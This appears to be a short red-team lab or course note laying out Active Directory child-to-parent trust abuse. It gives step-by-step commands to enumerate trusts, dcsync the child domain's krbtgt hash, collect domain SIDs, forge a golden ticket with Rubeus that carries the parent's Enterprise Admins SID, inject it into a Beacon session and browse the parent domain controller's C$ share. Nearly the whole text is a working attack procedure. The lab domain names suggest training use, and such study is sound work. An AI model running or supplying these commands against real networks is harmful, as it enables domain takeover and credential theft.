
### Child to Parent Abuse

- Enumerate the type of trust in place.
    
    BeaconTypeCopy
    
    `ldapsearch (objectClass=trustedDomain) --attributes trustPartner,trustDirection,trustAttributes,flatName`
    
-  Obtain the AES256 hash for the child domain's krbtgt account.
    
    1. dcsync dublin.contoso.com DUBLIN\krbtgt
-  Obtain the domain SID for _dublin.contoso.com_.
    
    1. ldapsearch (objectClass=domain) --attributes objectSid
-  Obtain the domain SID for _contoso.com_.
    
    1. ldapsearch (objectClass=domain) --attributes objectSid --hostname lon-dc-1.contoso.com --dn DC=contoso,DC=com
-  On the Attacker Desktop, forge a golden ticket and output to a file.
    
    TerminalTypeCopy
    
    `C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /user:Administrator /domain:dublin.contoso.com /sid:[DUBLIN SID] /sids:[CONTOSO EA GROUP SID] /aes256:[DUBLIN KRBTGT HASH] /outfile:C:\Users\Attacker\Desktop\golden`
    
-  Inject the ticket into Beacon.
    
    BeaconTypeCopy
    
    `kerberos_ticket_use C:\Users\Attacker\Desktop\[TICKET]`
    
-  Verify the ticket is in the session.
    
    1.  run klist
-  Access the parent domain's domain controller.
    
    1. ls \\lon-dc-1\c$